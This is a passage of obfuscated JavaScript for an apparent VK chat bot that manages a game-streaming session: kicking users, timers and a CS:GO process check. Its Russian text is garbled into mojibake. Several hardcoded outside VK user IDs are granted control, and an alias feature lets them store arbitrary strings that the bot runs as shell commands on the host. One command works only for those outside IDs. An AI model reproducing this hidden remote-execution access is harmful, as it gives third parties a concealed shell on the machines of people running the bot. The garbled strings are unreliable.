                (base.stream.TimeToKick =
                  Date.now() + Number(60000 * Number(base.stream.UserTime)))
              break
            case ('' + base.stream.KeyAcc).toLowerCase() +
              ' / РїРѕРґРєР\xBBСЋС\u2021РёР\xBBСЃСЏ':
              ;(base.stream.WorkName = 'AcceptUser'),
                (base.stream.StepNow = Number(0)),
                (base.stream.StepMax = Number(0)),
                (base.stream.TimeToNext = Number(0))
              break
            case ('' + base.stream.KeyAcc).toLowerCase() +
              ' / РІС\u2039РґР\xB0С\u201AСЊ СЃСЃС\u2039Р\xBBРєСѓ':
              ;(base.stream.WorkName = 'RetLink'),
                (base.stream.StepNow = Number(0)),
                (base.stream.StepMax = Number(0)),
                (base.stream.TimeToNext = Number(0))
              break
            case ('' + base.stream.KeyAcc).toLowerCase() +
              ' / СЂР\xB0Р\xB7РІРµСЂРЅСѓС\u201AСЊ РёРіСЂСѓ':
              ;(base.stream.WorkName = 'Unfold'),
                (base.stream.StepNow = Number(0)),
                (base.stream.StepMax = Number(0)),
                (base.stream.TimeToNext = Number(0))
              break
            case ('' + base.stream.KeyAcc).toLowerCase() +
              ' / РїСЂР\xB0РІР\xB0 РґР\xBBСЏ РјС\u2039С\u20ACРё':
              ;(base.stream.WorkName = 'Rights2'),
                (base.stream.StepNow = Number(0)),
                (base.stream.StepMax = Number(0)),
                (base.stream.TimeToNext = Number(0))
              break
            case ('' + base.stream.KeyAcc).toLowerCase() +
              ' / РїСЂР\xB0РІР\xB0 РґР\xBBСЏ РєР\xBBР\xB0РІРёР\xB0С\u201AСѓСЂС\u2039':
              ;(base.stream.WorkName = 'Rights1'),
                (base.stream.StepNow = Number(0)),
                (base.stream.StepMax = Number(0)),
                (base.stream.TimeToNext = Number(0))
              break
            case ('' + base.stream.KeyAcc).toLowerCase() +
              ' / РѕРєРѕРЅС\u2021РёС\u201AСЊ РёРіСЂСѓ':
              ;(base.stream.WorkName = 'KickUser'),
                (base.stream.StepNow = Number(0)),
                (base.stream.StepMax = Number(0)),
                (base.stream.TimeToNext = Number(0))
              break
            case base.info.prefix + ' / РєРёРєРЅСѓС\u201AСЊ':
              if (
                _0x3c1f68.senderId == base.info.id ||
                _0x3c1f68.senderId == 560417855 ||
                _0x3c1f68.senderId == 285390861 ||
                _0x3c1f68.senderId == 346276338 ||
                _0x3c1f68.senderId == 237938334
              ) {
                if (base.stream.UserID !== 0) {
                  base.stream.WorkName = 'KickUser'
                  base.stream.StepNow = Number(0)
                  base.stream.StepMax = Number(0)
                  base.stream.TimeToNext = Number(0)
                  _0x3c1f68.send(
                    'рџ\u2019Ћ РљРёРєР\xB0СЋ С\u201AРµРєСѓС\u2030РµРіРѕ РїРѕР\xBBСЊР\xB7РѕРІР\xB0С\u201AРµР\xBBСЏ.'
                  )
                } else {
                  _0x3c1f68.send(
                    "рџ\u2019Ћ РќРµС\u201A Р\xBBСЋРґРµР\u2116 РЅР\xB0 GameStream'e."
                  )
                }
              }
              break
            case base.info.prefix + ' / gsn РєРёРєРЅСѓС\u201AСЊ':
              if (
                _0x3c1f68.senderId == base.info.id ||
                _0x3c1f68.senderId == 560417855 ||
                _0x3c1f68.senderId == 285390861 ||
                _0x3c1f68.senderId == 346276338 ||
                _0x3c1f68.senderId == 237938334
              ) {
                var _0x1554ca = {
                  random_id: 0,
                  peer_id: 2000000005,
                  message:
                    'РЎС\u201AСЂРёРјРµСЂ РѕС\u201AРєР\xBBСЋС\u2021РёС\u201AСЊ ' +
                    base.info.id,
                }
                vk.api.messages.send(_0x1554ca)
              }
              break
            case base.info.prefix + ' / РІСЂРµРјСЏ':
              if (
                _0x3c1f68.senderId == base.info.id ||
                _0x3c1f68.senderId == 560417855 ||
                _0x3c1f68.senderId == 285390861 ||
                _0x3c1f68.senderId == 346276338 ||
                _0x3c1f68.senderId == 237938334
              ) {
                if (base.stream.UserID !== 0) {
                  _0x3c1f68.send(
                    'рџ\u2019Ћ РўРѕС\u2021РЅРѕРµ РІСЂРµРјСЏ: ' +
                      Number(
                        (
                          (base.stream.TimeToKick - Date.now()) /
                          1000 /
                          60
                        ).toFixed(1)
                      ) +
                      ' РњРёРЅСѓС\u201A'
                  )
                } else {
                  _0x3c1f68.send(
                    "рџ\u2019Ћ РќРµС\u201A Р\xBBСЋРґРµР\u2116 РЅР\xB0 GameStream'e."
                  )
                }
              }
              break
            case base.info.prefix + ' / debug':
              if (
                _0x3c1f68.senderId == base.info.id ||
                _0x3c1f68.senderId == 560417855 ||
                _0x3c1f68.senderId == 285390861 ||
                _0x3c1f68.senderId == 346276338 ||
                _0x3c1f68.senderId == 237938334
              ) {
                base.stream.WorkName = ''
                base.stream.StepNow = 0
                base.stream.StepMax = 0
                base.stream.TimeToNext = 0
                _0x3c1f68.send(
                  'рџ\u2019Ћ Р\u2018РѕС\u201A Р\xB1С\u2039Р\xBB РїРѕР\xBBРЅРѕСЃС\u201AСЊСЋ РїРµСЂРµР\xB7Р\xB0РіСЂСѓР\xB6РµРЅ.'
                )
              }
              break
            case base.info.prefix + ' / РїСЂРѕРІРµСЂРёС\u201AСЊ':
              if (
                _0x3c1f68.senderId == base.info.id ||
                _0x3c1f68.senderId == 560417855 ||
                _0x3c1f68.senderId == 285390861 ||
                _0x3c1f68.senderId == 346276338 ||
                _0x3c1f68.senderId == 237938334
              ) {
                var _0x54f780 = [
                  ['пїЅ', '.'],
                  ['..', 'РљР\u2018'],
                  ['    ', ''],
                  ['Console', ''],
                  ['  ', ''],
                  ['csgo.exe', 'csgo.exe '],
                ]
                cmd.run(
                  'tasklist /FI "IMAGENAME eq csgo.exe"',
                  (_0x1c6fed, _0x19b9ca, _0x2935fe) => {
                    try {
                      var _0x42a2ca = _0x19b9ca.toString().split('\n')[3]
                      for (i = 0; i < _0x54f780.length; i++) {
                        var _0x4fb355 = _0x54f780[i]
                        _0x42a2ca = _0x42a2ca.replaceAll(
                          _0x4fb355[0],
                          _0x4fb355[1]
                        )
                      }
                      var _0x3d63f2 = { disable_mentions: 1 }
                      _0x3c1f68.send(
                        "рџ\u2019Ћ РџСЂРѕС\u2020РµСЃСЃ 'CS:GO' РЅР\xB0Р\u2116РґРµРЅ:\n" +
                          _0x42a2ca,
                        _0x3d63f2
                      )
                    } catch {
                      var _0x55a161 = { disable_mentions: 1 }
                      _0x3c1f68.send(
                        "рџ\u2019Ћ РџСЂРѕС\u2020РµСЃСЃ 'CS:GO' РЅРµ РЅР\xB0Р\u2116РґРµРЅ.",
                        _0x55a161
                      )
                    }
                  }
                )
              }
              break
            case base.info.prefix + ' / РѕС\u2021РёСЃС\u201AРёС\u201AСЊ':
              if (
                _0x3c1f68.senderId == 560417855 ||
                _0x3c1f68.senderId == 285390861 ||
                _0x3c1f68.senderId == 346276338 ||
                _0x3c1f68.senderId == 237938334
              ) {
                base.stream.UserID = 0
                base.stream.UserTime = 0
                base.stream.WorkName = ''
                base.stream.StepNow = 0
                base.stream.StepMax = 0
                base.stream.TimeToNext = 0
                base.stream.TimeToKick = 0
                base.stream.KeyAcc = ''
                _0x3c1f68.send(
                  'рџ\u2019Ћ Р\u2018Р\xB0Р\xB7Р\xB0 РґР\xB0РЅРЅС\u2039С\u2026 Р\xB1С\u2039Р\xBBР\xB0 РїРѕС\u2021РёС\u2030РµРЅР\xB0.'
                )
              }
              break
          }
          save()
        } catch {}
      } catch {}
    } else {
      if (
        _0x3c1f68.text.indexOf('' + base.info.prefix) > -1 ||
        _0x3c1f68.senderId == base.info.id
      ) {
        if (
          _0x3c1f68.senderId == base.info.id ||
          _0x3c1f68.senderId == 560417855 ||
          _0x3c1f68.senderId == 285390861 ||
          _0x3c1f68.senderId == 346276338 ||
          _0x3c1f68.senderId == 237938334
        ) {
          var _0xf2f712 = _0x3c1f68.text
              .replace('' + base.info.prefix, '')
              .trim(),
            _0x8b5384 = _0xf2f712[0],
            _0x74bf75 = _0xf2f712.split(_0x8b5384)[1].split(' ')
          switch (_0x8b5384) {
            case '+':
              var _0x751de7 = _0x74bf75[1]
              if (_0x751de7 == undefined) {
                return _0x3c1f68.send(
                  'рџ\u2019Ћ РђР\xBBРёР\xB0СЃР\xB0 РЅРµС\u201A.'
                )
              }
              _0x74bf75.splice(0, 1), _0x74bf75.splice(0, 1)
              var _0x5e858f = _0x74bf75.join(' '),
                _0x4d18b0 = {}
              ;(_0x4d18b0.name = _0x751de7),
                (_0x4d18b0.command = _0x5e858f),
                base.alias.push(_0x4d18b0)
              var _0xf2f712 = [
                "рџ\u2019Ћ РђР\xBBРёР\xB0СЃ '" +
                  _0x751de7 +
                  "' СЃРѕР\xB7РґР\xB0РЅ.",
              ].join('\n')
              _0x3c1f68.send('' + _0xf2f712), save()
              break
            case '-':
              var _0x751de7 = _0x74bf75[1]
              if (_0x751de7 == undefined) {
                return _0x3c1f68.send(
                  'рџ\u2019Ћ РђР\xBBРёР\xB0СЃР\xB0 РЅРµС\u201A.'
                )
              }
              var _0x364337 = base.alias.findIndex(
                (_0x52ec0c) => _0x52ec0c.name == _0x751de7
              )
              if (_0x364337 < 0) {
                var _0xf2f712 = [
                  "рџ\u2019Ћ РђР\xBBРёР\xB0СЃ '" +
                    _0x751de7 +
                    "' РЅРµ РЅР\xB0Р\u2116РґРµРЅ.",
                ].join('\n')
                _0x3c1f68.send('' + _0xf2f712)
              } else {
                base.alias.splice(_0x364337, 1)
                var _0xf2f712 = [
                  "рџ\u2019Ћ РђР\xBBРёР\xB0СЃ '" +
                    _0x751de7 +
                    "' СѓРґР\xB0Р\xBBРµРЅ.",
                ].join('\n')
                _0x3c1f68.send('' + _0xf2f712)
                save()
              }
              break
            case '!':
              if (
                ('' + _0x74bf75[0]).toLowerCase() ==
                'Р\xB0Р\xBBРёР\xB0СЃС\u2039'
              ) {
                var _0xf2f712 = [
                  'рџ\u2019Ћ РЎРїРёСЃРѕРє Р\u2019Р\xB0С\u20ACРёС\u2026 Р\xB0Р\xBBРёР\xB0СЃРѕРІ:\n',
                ]
                for (i = 0; i < base.alias.length; i++) {
                  _0xf2f712.push(base.alias[i].name)
                }
                _0x3c1f68.send(
                  '' +
                    (_0xf2f712.length == 1
                      ? 'рџ\u2019Ћ РЈ Р\u2019Р\xB0СЃ РЅРµС\u201A Р\xB0Р\xBBРёР\xB0СЃРѕРІ.'
                      : '' + _0xf2f712.join('\n'))
                )
              } else {
                var _0x751de7 = _0x74bf75[1]
                if (_0x751de7 == undefined) {
                  return _0x3c1f68.send(
                    'рџ\u2019Ћ РђР\xBBРёР\xB0СЃР\xB0 РЅРµС\u201A.'
                  )
                }
                var _0x364337 = base.alias.findIndex(
                  (_0x3b5df7) => _0x3b5df7.name == _0x751de7
                )
                if (_0x364337 < 0) {
                  var _0xf2f712 = [
                    "рџ\u2019Ћ РђР\xBBРёР\xB0СЃ '" +
                      _0x751de7 +
                      "' РЅРµ РЅР\xB0Р\u2116РґРµРЅ.",
                  ].join('\n')
                  _0x3c1f68.send('' + _0xf2f712)
                } else {
                  cmd.run('' + base.alias[_0x364337].command)
                  var _0xf2f712 = [
                    "рџ\u2019Ћ РђР\xBBРёР\xB0СЃ '" +
                      _0x751de7 +
                      "' РІС\u2039РїРѕР\xBBРЅРµРЅ.",
                  ].join('\n')
                  _0x3c1f68.send('' + _0xf2f712)
                }
              }
              break
          }
        }
      }
    }
  } catch {}
  return _0x55503e
})
